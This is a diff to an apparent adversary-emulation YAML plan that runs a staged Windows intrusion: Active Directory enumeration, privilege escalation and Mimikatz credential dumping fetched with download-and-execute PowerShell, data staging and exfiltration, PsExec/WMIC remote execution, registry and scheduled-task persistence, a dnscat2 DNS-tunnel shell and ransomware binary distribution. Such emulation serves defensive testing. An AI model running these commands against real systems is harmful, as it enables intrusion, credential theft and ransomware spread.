@@ -23,14 +23,15 @@
     windows:
       cmd:
         command: |
-          adfind.exe -f (objectcategory=person) > ad_users.txt
-        payloads: 
+          "#{adfind_exe}" -f (objectcategory=person) > ad_users.txt
+        payloads:
         - adfind.exe
 
   input_arguments:
     adfind_exe:
       description: Path of adfind.exe
       type: Path
+      default: adfind.exe
 
     adfind_url:
       description: Path to download ADFind zip file
@@ -43,21 +44,21 @@
 
   dependency_executor_name: powershell
   dependencies:
-    - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
-      prereq_command: |
-        if (Test-Path #{adfind_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
-        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
-        if(Invoke-WebRequestVerifyHash "#{adfind_url}" "$zippath" #{adfind_zip_hash}) {
-        Expand-Archive $zippath $parentpath\adfind -Force
-        Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
-        Remove-Item $zippath, $parentpath\adfind -Recurse
-        }
+  - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
+    prereq_command: |
+      if (Test-Path "#{adfind_exe}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{adfind_url}" $zippath "#{adfind_zip_hash}") {
+      Expand-Archive $zippath $parentpath\adfind -Force
+      Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
+      Remove-Item $zippath, $parentpath\adfind -Recurse
+      }
   executors:
-    - name: command_prompt
-      command: |
-        "#{adfind_exe}" -f (objectcategory=person) > ad_users.txt
+  - name: command_prompt
+    command: |
+      "#{adfind_exe}" -f (objectcategory=person) > ad_users.txt
 
 - id: 5b24eef2-7a7f-4d34-8cab-e588074c59bc
   name: Enumerate AD computer objects
@@ -73,14 +74,15 @@
     windows:
       cmd:
         command: |
-          "adfind.exe -f (objectcategory=computer) > ad_computers.txt"
-        payloads: 
+          "#{adfind_exe}" -f (objectcategory=computer) > ad_computers.txt
+        payloads:
         - adfind.exe
 
   input_arguments:
     adfind_exe:
       description: Path of adfind.exe
       type: Path
+      default: adfind.exe
 
     adfind_url:
       description: Path to download ADFind zip file
@@ -93,21 +95,21 @@
 
   dependency_executor_name: powershell
   dependencies:
-    - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
-      prereq_command: |
-        if (Test-Path #{adfind_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
-        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
-        if(Invoke-WebRequestVerifyHash "#{adfind_url}" "$zippath" \#{adfind_zip_hash}) {
-        Expand-Archive $zippath $parentpath\adfind -Force
-        Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
-        Remove-Item $zippath, $parentpath\adfind -Recurse
-        }
+  - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
+    prereq_command: |
+      if (Test-Path "#{adfind_exe}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{adfind_url}" $zippath "#{adfind_zip_hash}") {
+      Expand-Archive $zippath $parentpath\adfind -Force
+      Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
+      Remove-Item $zippath, $parentpath\adfind -Recurse
+      }
   executors:
-    - name: command_prompt
-      command: |
-        "#{adfind_exe}" -f (objectcategory=computer) > ad_computers.txt
+  - name: command_prompt
+    command: |
+      "#{adfind_exe}" -f (objectcategory=computer) > ad_computers.txt
 
 - id: d30692dd-779f-4a40-b947-de23dabbb033
   name: Enumerate AD Organizational Units
@@ -123,14 +125,15 @@
     windows:
       cmd:
         command: |
-          adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt
-        payloads: 
+          "#{adfind_exe}" -f (objectcategory=organizationalUnit) > ad_ous.txt
+        payloads:
         - adfind.exe
 
   input_arguments:
     adfind_exe:
       description: Path of adfind.exe
       type: Path
+      default: adfind.exe
 
     adfind_url:
       description: Path to download ADFind zip file
@@ -143,22 +146,22 @@
 
   dependency_executor_name: powershell
   dependencies:
-    - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
-      prereq_command: |
-        if (Test-Path #{adfind_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
-        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
-        if(Invoke-WebRequestVerifyHash "#{adfind_url}" "$zippath" \#{adfind_zip_hash}) {
-        Expand-Archive $zippath $parentpath\adfind -Force
-        Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
-        Remove-Item $zippath, $parentpath\adfind -Recurse
-        }
+  - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
+    prereq_command: |
+      if (Test-Path "#{adfind_exe}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{adfind_url}" $zippath "#{adfind_zip_hash}") {
+      Expand-Archive $zippath $parentpath\adfind -Force
+      Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
+      Remove-Item $zippath, $parentpath\adfind -Recurse
+      }
 
   executors:
-    - name: command_prompt
-      command: |
-        "#{adfind_exe}" -f (objectcategory=organizationalUnit) > ad_ous.txt
+  - name: command_prompt
+    command: |
+      "#{adfind_exe}" -f (objectcategory=organizationalUnit) > ad_ous.txt
 
 - id: 02a96c18-f700-482d-88a8-bd311f6c41dc
   name: Enumerate AD trust objects
@@ -174,14 +177,15 @@
     windows:
       cmd:
         command: |
-          adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt
-        payloads: 
+          "#{adfind_exe}" -gcb -sc trustdmp > ad_trustdmp.txt
+        payloads:
         - adfind.exe
 
   input_arguments:
     adfind_exe:
       description: Path of adfind.exe
       type: Path
+      default: adfind.exe
 
     adfind_url:
       description: Path to download ADFind zip file
@@ -194,22 +198,22 @@
 
   dependency_executor_name: powershell
   dependencies:
-    - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
-      prereq_command: |
-        if (Test-Path #{adfind_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
-        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
-        if(Invoke-WebRequestVerifyHash "#{adfind_url}" "$zippath" \#{adfind_zip_hash}) {
-        Expand-Archive $zippath $parentpath\adfind -Force
-        Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
-        Remove-Item $zippath, $parentpath\adfind -Recurse
-        }
+  - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
+    prereq_command: |
+      if (Test-Path "#{adfind_exe}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{adfind_url}" $zippath "#{adfind_zip_hash}") {
+      Expand-Archive $zippath $parentpath\adfind -Force
+      Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
+      Remove-Item $zippath, $parentpath\adfind -Recurse
+      }
 
   executors:
-    - name: command_prompt
-      command: |
-        "#{adfind_exe}" -gcb -sc trustdmp > ad_trustdmp.txt
+  - name: command_prompt
+    command: |
+      "#{adfind_exe}" -gcb -sc trustdmp > ad_trustdmp.txt
 
 - id: e4cdb5c6-d322-3b6e-ac8e-68b2e8a7dd4c
   name: Enumerate AD subnets
@@ -225,14 +229,15 @@
     windows:
       cmd:
         command: |
-          adfind.exe -subnets -f (objectCategory=subnet) > ad_subnets.txt
-        payloads: 
+          "#{adfind_exe}" -subnets -f (objectCategory=subnet) > ad_subnets.txt
+        payloads:
         - adfind.exe
 
   input_arguments:
     adfind_exe:
       description: Path of adfind.exe
       type: Path
+      default: adfind.exe
 
     adfind_url:
       description: Path to download ADFind zip file
@@ -245,22 +250,22 @@
 
   dependency_executor_name: powershell
   dependencies:
-    - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
-      prereq_command: |
-        if (Test-Path #{adfind_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
-        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
-        if(Invoke-WebRequestVerifyHash "#{adfind_url}" "$zippath" \#{adfind_zip_hash}) {
-        Expand-Archive $zippath $parentpath\adfind -Force
-        Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
-        Remove-Item $zippath, $parentpath\adfind -Recurse
-        }
+  - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
+    prereq_command: |
+      if (Test-Path "#{adfind_exe}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{adfind_url}" $zippath "#{adfind_zip_hash}") {
+      Expand-Archive $zippath $parentpath\adfind -Force
+      Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
+      Remove-Item $zippath, $parentpath\adfind -Recurse
+      }
 
   executors:
-    - name: command_prompt
-      command: |
-        "#{adfind_exe}" -subnets -f (objectCategory=subnet) > ad_subnets.txt
+  - name: command_prompt
+    command: |
+      "#{adfind_exe}" -subnets -f (objectCategory=subnet) > ad_subnets.txt
 
 - id: 2738b811-a360-4a4f-af9d-704343ebab4d
   name: Enumerate AD groups
@@ -276,14 +281,15 @@
     windows:
       cmd:
         command: |
-          adfind.exe -f (objectcategory=group) > ad_group.txt
-        payloads: 
+          "#{adfind_exe}" -f (objectcategory=group) > ad_group.txt
+        payloads:
         - adfind.exe
 
   input_arguments:
     adfind_exe:
       description: Path of adfind.exe
       type: Path
+      default: adfind.exe
 
     adfind_url:
       description: Path to download ADFind zip file
@@ -296,22 +302,22 @@
 
   dependency_executor_name: powershell
   dependencies:
-    - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
-      prereq_command: |
-        if (Test-Path #{adfind_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
-        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
-        if(Invoke-WebRequestVerifyHash "#{adfind_url}" "$zippath" \#{adfind_zip_hash}) {
-        Expand-Archive $zippath $parentpath\adfind -Force
-        Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
-        Remove-Item $zippath, $parentpath\adfind -Recurse
-        }
+  - description: Adfind.exe must exist on disk at specified location (#{adfind_exe})
+    prereq_command: |
+      if (Test-Path "#{adfind_exe}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{adfind_exe}"; $zippath = "$parentpath\adfind.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{adfind_url}" $zippath "#{adfind_zip_hash}") {
+      Expand-Archive $zippath $parentpath\adfind -Force
+      Move-Item $parentpath\adfind\adfind.exe "#{adfind_exe}"
+      Remove-Item $zippath, $parentpath\adfind -Recurse
+      }
 
   executors:
-    - name: command_prompt
-      command: |
-        "#{adfind_exe}" -f (objectcategory=group) > ad_group.txt
+  - name: command_prompt
+    command: |
+      "#{adfind_exe}" -f (objectcategory=group) > ad_group.txt
 
 # Phase 1: Privilege Escalation
 
@@ -330,10 +336,10 @@
         command: |
           powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1'); Get-System -ServiceName 'mstdc' -PipeName 'mstdc'"
 
-    executors:
-    - name: command_prompt
-      command: |
-        "powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1'); Get-System -ServiceName 'mstdc' -PipeName 'mstdc'"""
+  executors:
+  - name: command_prompt
+    command: |
+      powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1'); Get-System -ServiceName 'mstdc' -PipeName 'mstdc'"
 
 # Phase 1: Credential Access
 
@@ -354,9 +360,9 @@
           powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
 
   executors:
-    - name: command_prompt
-      command: |
-        "powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds""
+  - name: command_prompt
+    command: |
+      powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
 
 - id: 97412b40-4940-4da1-8bff-6f11d42bca26
   name: WCE Credential Access
@@ -372,8 +378,8 @@
     windows:
       cmd:
         command: |
-          wce.exe -w -o wce_creds.txt
-        payloads: 
+          "#{wce_exe}" -w -o "#{output_file}"
+        payloads:
         - wce.exe
         cleanup: |
           del "#{output_file}" >nul 2>&1
@@ -387,6 +393,7 @@
     wce_exe:
       description: Path of Windows Credential Editor
       type: Path
+      default: wce.exe
 
     wce_url:
       description: Path to download Windows Credential Editor zip file
@@ -399,25 +406,25 @@
 
   dependency_executor_name: powershell
   dependencies:
-    - description: Windows Credential Editor must exist on disk at specified location (#{wce_exe})
-      prereq_command: |
-        if (Test-Path #{wce_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
-        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
-        if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}) {
-        Expand-Archive $zippath $parentpath\wce -Force
-        Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
-        Remove-Item $zippath, $parentpath\wce -Recurse
-        }
+  - description: Windows Credential Editor must exist on disk at specified location (#{wce_exe})
+    prereq_command: |
+      if (Test-Path "#{wce_exe}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{wce_url}" $zippath "#{wce_zip_hash}") {
+      Expand-Archive $zippath $parentpath\wce -Force
+      Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
+      Remove-Item $zippath, $parentpath\wce -Recurse
+      }
 
   executors:
-    - name: command_prompt
-      elevation_required: true
-      command: |
-        "#{wce_exe} -o #{output_file}"
-      cleanup_command: |
-        del "#{output_file}" >nul 2>&1
+  - name: command_prompt
+    elevation_required: true
+    command: |
+      "#{wce_exe}" -w -o "#{output_file}"
+    cleanup_command: |
+      del "#{output_file}" >nul 2>&1
 
 # Phase 1: Collection
 
@@ -435,42 +442,43 @@
     windows:
       cmd:
         command: |
-          7.exe a -mx3 ad.7z ad_*
-        payloads: 
-        - 7.exe
+          "#{7zip_exe}" a -mx3 ad.7z ad_*
+        payloads:
+        - 7za.exe
 
   input_arguments:
-    7_exe:
-      description: Path of 7.exe
+    7zip_exe:
+      description: Path of 7za.exe
       type: Path
+      default: C:\Windows\Temp\7za.exe
 
-    7_url:
-      description: Path to download 7zip file
+    7zip_url:
+      description: Path to download 7za zip file
       type: URL
-      default: https://7-zip.org/a/7z1900-x64.exe
+      default: https://www.7-zip.org/a/7za920.zip
 
-    7_hash:
-      description: File hash of the 7 zip file
+    7zip_hash:
+      description: File hash of the 7za zip file
       type: String
 
   dependency_executor_name: powershell
   dependencies:
-    - description: 7.exe must exist on disk at specified location (#{7_exe})
-      prereq_command: |
-        if (Test-Path #{7_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        $parentpath = Split-Path "#{7_exe}"; $zippath = "$parentpath\7.zip"
-        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
-        if(Invoke-WebRequestVerifyHash "#{7_url}" "$zippath" \#{7_hash}) {
-        Expand-Archive $zippath $parentpath\7 -Force
-        Move-Item $parentpath\7\7.exe "#{7_exe}"
-        Remove-Item $zippath, $parentpath\7 -Recurse
-        }
+  - description: 7zip.exe must exist on disk at specified location ("#{7zip_exe}")
+    prereq_command: |
+      if (Test-Path "#{7zip_exe}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{7zip_exe}"; $zippath = "$parentpath\7za920.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{7zip_url}" $zippath "#{7zip_hash}") {
+      Expand-Archive $zippath $parentpath\7 -Force
+      Move-Item $parentpath\7za920\7za.exe "#{7zip_exe}"
+      Remove-Item $zippath, $parentpath\7za920 -Recurse
+      }
 
   executors:
-    - name: command_prompt
-      command: |
-        "#{7_exe}" a -mx3 ad.7z ad_*"
+  - name: command_prompt
+    command: |
+      "#{7zip_exe}" a -mx3 ad.7z ad_*
 
 # Phase 1/2: Exfiltration
 
@@ -488,19 +496,21 @@
     windows:
       cmd:
         command: |
-          putty.exe -ssh #{user}@#{exfil_server}
-        payloads: 
+          "#{putty_exe}" -ssh #{user}@#{exfil_server}
+        payloads:
         - putty.exe
 
   input_arguments:
     putty_exe:
       description: Path of putty.exe
       type: Path
+      default: putty.exe
 
     putty_url:
       description: Path to download putty file
       type: URL
-      default: https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe
+      default: |
+        https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe
 
     putty_hash:
       description: File hash of the putty exe file
@@ -517,23 +527,23 @@
 
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        putty.exe must exist on disk at specified location (#{putty_exe})
-      prereq_command: |
-        if (Test-Path #{putty_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        $parentpath = Split-Path "#{putty_exe}"; $zippath = "$parentpath\putty.zip"
-        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
-        if(Invoke-WebRequestVerifyHash "#{putty_url}" "$zippath" \#{putty_hash}) {
-        Expand-Archive $zippath $parentpath\putty -Force
-        Move-Item $parentpath\putty\putty.exe "#{putty_exe}"
-        Remove-Item $zippath, $parentpath\putty -Recurse
-        }
+  - description: |
+      putty.exe must exist on disk at specified location (#{putty_exe})
+    prereq_command: |
+      if (Test-Path "#{putty_exe}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{putty_exe}"; $zippath = "$parentpath\putty.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{putty_url}" $zippath "#{putty_hash}") {
+      Expand-Archive $zippath $parentpath\putty -Force
+      Move-Item $parentpath\putty\putty.exe "#{putty_exe}"
+      Remove-Item $zippath, $parentpath\putty -Recurse
+      }
 
   executors:
-    - name: command_prompt
-      command: |
-        "#{putty_exe}" -ssh #{user}@#{exfil_server}
+  - name: command_prompt
+    command: |
+      "#{putty_exe}" -ssh #{user}@#{exfil_server}
 
 # Phase 2: Execution - Point of Sale (POS)
 
@@ -551,15 +561,15 @@
     windows:
       cmd:
         command: |
-          PsExec.exe \\#{remote_host} #{remote_command}
-        payloads: 
+          "#{psexec_exe}" \\#{remote_host} #{remote_command}
+        payloads:
         - PsExec.exe
 
   input_arguments:
     psexec_exe:
       description: Path to Psexec
       type: string
-      default: "C:\\PSTools\\PsExec.exe"
+      default: C:\PSTools\PsExec.exe
     remote_host:
       description: Remote host or IP address
       type: string
@@ -571,21 +581,21 @@
 
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        PsExec must exist on disk at specified location (#{psexec_exe})
-      prereq_command: |
-        if (Test-Path #{psexec_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PSTools.zip"
-        Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
-        New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
-        Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
+  - description: |
+      PsExec must exist on disk at specified location (#{psexec_exe})
+    prereq_command: |
+      if (Test-Path "#{psexec_exe}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PSTools.zip"
+      Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+      New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
+      Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
 
   executors:
-    - name: powershell
-      elevation_required: false
-      command: |
-        "#{psexec_exe}" \\#{remote_host} #{remote_command}
+  - name: powershell
+    elevation_required: false
+    command: |
+      "#{psexec_exe}" \\#{remote_host} #{remote_command}
 
 - id: 661efd66-d876-41de-88ee-ba9ec4328154
   name: WMIC Remote Process Execution
@@ -601,9 +611,9 @@
     windows:
       cmd:
         command: |
-          wmic /node: #{node} process call create #{process_to_execute}
+          wmic /node:#{node} process call create #{process_to_execute}
         cleanup: |
-          wmic /node: #{node} process where name=#{process_to_execute} del >nul 2>&1
+          wmic /node:#{node} process where name=#{process_to_execute} del >nul 2>&1
 
   input_arguments:
     node:
@@ -616,12 +626,12 @@
       default: notepad.exe
 
   executors:
-    - name: command_prompt
-      elevation_required: false
-      command: |
-        wmic /node: #{node} process call create #{process_to_execute}
-      cleanup_command: |
-        wmic /node: #{node} process where name="#{process_to_execute}" delete >nul 2>&1
+  - name: command_prompt
+    elevation_required: false
+    command: |
+      wmic /node:#{node} process call create #{process_to_execute}
+    cleanup_command: |
+      wmic /node:#{node} process where name="#{process_to_execute}" delete >nul 2>&1
 
 # Phase 2: Persistence - Point of Sale (POS)
 
@@ -639,7 +649,7 @@
     windows:
       cmd:
         command: |
-          "C:\Windows\System32\reg.exe" ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v #{value_name} /t REG_SZ /d #{data} "C:\#{path},workerInstance /f
+          "C:\Windows\System32\reg.exe" ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "#{value_name}" /t REG_SZ /d "#{data}" /f
 
   input_arguments:
     value_name:
@@ -648,14 +658,11 @@
     data:
       description: Data for new registry entry
       type: string
-    path:
-      description: Path
-      type: string
 
   executors:
-    - name: command_prompt
-      command: |
-        "C:\Windows\System32\reg.exe" ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v #{value_name} /t REG_SZ /d #{data} "C:\#{path},workerInstance /f
+  - name: command_prompt
+    command: |
+      "C:\Windows\System32\reg.exe" ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "#{value_name}" /t REG_SZ /d "#{data}" /f
 
 - id: 0864a91a-ae17-1cce-8b89-d4f8f2854699
   name: Scheduled Task Persistence
@@ -671,13 +678,13 @@
     windows:
       cmd:
         command: |
-          "C:\Windows\System32\schtasks.exe" /create /tn #{task_name} /tr rundll32.exe C:\#{path},WorkerInstance /sc #{schedule} /ru System
+          "C:\Windows\System32\schtasks.exe" /create /tn "#{task_name}" /tr "#{task_run}" /sc #{schedule} /ru System
 
   input_arguments:
     task_name:
       description: Task Name
       type: string
-    path:
+    task_run:
       description: Path of task to run
       type: string
     schedule:
@@ -685,9 +692,9 @@
       type: string
 
   executors:
-    - name: command_prompt
-      command: |
-        "C:\Windows\System32\schtasks.exe" /create /tn #{task_name} /tr rundll32.exe C:\#{path},WorkerInstance /sc #{schedule} /ru System
+  - name: command_prompt
+    command: |
+      "C:\Windows\System32\schtasks.exe" /create /tn "#{task_name}" /tr "#{task_run}" /sc #{schedule} /ru System
 
 # Phase 2: Exfiltration - Point of Sale (POS)
 
@@ -705,49 +712,41 @@
     windows:
       psh:
         command: |
-          import-module #{file_path}\\dnscat2.ps1
-          Start-Dnscat2 -Domain #{dnscat2_server} Exec cmd
-        payloads: 
+          import-module "#{dnscat_ps1}"
+          Start-Dnscat2 -Domain #{dnscat2_server} -Exec cmd
+        payloads:
         - dnscat2.ps1
 
   input_arguments:
     dnscat_ps1:
       description: Path of dnscat2.ps1
       type: Path
+      default: C:\dnscat2.ps1
 
     dnscat2_url:
       description: Path to download dnscat2 .ps1 file
       type: URL
       default: https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1
 
-    dnscat2_hash:
-      description: File hash of the dnscat2 .ps1 file
-      type: String
-
     dnscat2_server:
       description: IP address
       type: string
       default: 127.0.0.1
 
-  dependency_executor_name: dnscat2.ps1
+  dependency_executor_name: powershell
   dependencies:
-    - description: |
-        dnscat2.ps1 must exist on disk at specified location (#{dnscat_ps1})
-      prereq_command: |
-        if (Test-Path #{dnscat_ps1}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        $parentpath = Split-Path "#{dnscat_ps1}"; $zippath = "$parentpath\dnscat2.zip"
-        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
-        if(Invoke-WebRequestVerifyHash "#{dnscat2_url}" "$zippath" \#{dnscat2_hash}) {
-        Expand-Archive $zippath $parentpath\dnscat2 -Force
-        Move-Item $parentpath\dnscat2\dnscat2.exe "#{dnscat_ps1}"
-        Remove-Item $zippath, $parentpath\dnscat2 -Recurse
-        }
+  - description: |
+      dnscat2.ps1 must exist on disk at specified location (#{dnscat_ps1})
+    prereq_command: |
+      if (Test-Path "#{dnscat_ps1}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "#{dnscat2_url}" -OutFile "#{dnscat_ps1}"
 
   executors:
-    - name: powershell
-      command: |
-        Start-Dnscat2 -Domain #{dnscat2_server} Exec cmd
+  - name: powershell
+    command: |
+      import-module "#{dnscat_ps1}"
+      Start-Dnscat2 -Domain #{dnscat2_server} -Exec cmd
 
 # Phase 2: Execution - Ransomware
 
@@ -765,7 +764,7 @@
     windows:
       cmd:
         command: |
-          start wmic /node:#{Ransomware_recipient} /user:#{"domain_user"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+          start wmic /node:#{Ransomware_recipient} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
 
   input_arguments:
     Ransomware_recipient:
@@ -785,9 +784,9 @@
       default: 127.0.0.1
 
   executors:
-    - name: command_prompt
-      command: |
-        start wmic /node:#{Ransomware_recipient} /user:#{"domain_user"} /password:#{"password"} process call create "cmd.exe /c copy \\#{internal IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+  - name: command_prompt
+    command: |
+      start wmic /node:#{Ransomware_recipient} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
 
 # Phase 2: Lateral Movement - Ransomware
 
@@ -805,7 +804,7 @@
     windows:
       cmd:
         command: |
-          start copy xaa.bat \\#{internal_IP}\c$\windows\temp\
+          start copy sss.exe \\#{internal_IP}\c$\windows\temp\
 
   input_arguments:
     internal_IP:
@@ -814,9 +813,9 @@
       default: 127.0.0.1
 
   executors:
-    - name: command_prompt
-      command: |
-        start copy sss.exe \\#{internal_IP}\c$\windows\temp\
+  - name: command_prompt
